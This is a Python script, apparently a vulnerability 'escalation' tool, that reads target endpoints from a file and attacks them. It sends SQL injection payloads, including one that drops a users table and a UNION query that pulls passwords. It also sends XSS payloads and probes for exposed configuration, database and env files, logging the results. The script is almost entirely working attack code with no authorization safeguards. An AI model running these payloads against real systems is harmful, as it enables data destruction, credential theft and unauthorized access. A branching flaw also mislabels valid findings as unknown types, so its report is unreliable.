import requests
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(filename='vulnerability_escalation.log', level=logging.INFO)

def log_step(step_description):
    logging.info(f"{datetime.now()} - {step_description}")

def load_vulnerabilities(file_path):
    log_step(f"Loading vulnerabilities from file: {file_path}")
    with open(file_path, 'r') as file:
        vulnerabilities = file.readlines()
    log_step(f"Loaded {len(vulnerabilities)} vulnerabilities")
    return vulnerabilities

def attempt_sql_injection(endpoint, param):
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    for payload in payloads:
        params = {param: payload}
        response = requests.get(endpoint, params=params)
        log_step(f"SQL Injection Attempt at {endpoint} with payload '{payload}': Status Code {response.status_code}")

def attempt_xss(endpoint, param):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        params = {param: payload}
        response = requests.get(endpoint, params=params)
        log_step(f"XSS Attempt at {endpoint} with payload '{payload}': Status Code {response.status_code}")

def check_document_access(endpoint):
    common_files = ['config.yaml', 'config.json', 'database.sql', 'env']
    for file in common_files:
        response = requests.get(f"{endpoint}/{file}")
        if response.status_code == 200:
            log_step(f"Accessible document found: {file} at {endpoint}/{file}")
        else:
            log_step(f"Document not accessible: {file} at {endpoint}/{file}")

def check_user_data_access(endpoint, param):
    payloads = ["' OR '1'='1", "' UNION SELECT user_data, password FROM users; --"]
    for payload in payloads:
        params = {param: payload}
        response = requests.get(endpoint, params=params)
        if "user_data" in response.text:
            log_step(f"Potential user data access vulnerability found with payload '{payload}' at {endpoint}")
        else:
            log_step(f"User data access vulnerability not found with payload '{payload}' at {endpoint}")

def escalate_vulnerabilities(file_path):
    vulnerabilities = load_vulnerabilities(file_path)
    for vuln in vulnerabilities:
        vuln_data = vuln.strip().split(',')
        endpoint = vuln_data[0]
        param = vuln_data[1]
        vuln_type = vuln_data[2]
        
        log_step(f"Escalating {vuln_type} vulnerability at {endpoint} with parameter {param}")
        
        if vuln_type == 'SQL Injection':
            attempt_sql_injection(endpoint, param)
        elif vuln_type == 'XSS':
            attempt_xss(endpoint, param)
        
        # Document Access Check
        if vuln_type == 'Document Access':
            if input("Check for document access? (yes/no): ").lower() == 'yes':
                check_document_access(endpoint)
        
        # User Data Access Check
        if vuln_type == 'User Data Access':
            if input("Check for user data access? (yes/no): ").lower() == 'yes':
                check_user_data_access(endpoint, param)
        else:
            log_step(f"Unknown vulnerability type: {vuln_type}")
    
    # Ask for output location for the report
    output_location = input("Please specify the output location for the report: ")
    with open(f"{output_location}/vulnerability_escalation_report.log", 'w') as report_file:
        with open('vulnerability_escalation.log', 'r') as log_file:
            report_file.write(log_file.read())
    
    print(f"Report saved to {output_location}/vulnerability_escalation_report.log")

if __name__ == '__main__':
    file_path = input("Please enter the file path for detected vulnerabilities: ")
    escalate_vulnerabilities(file_path)
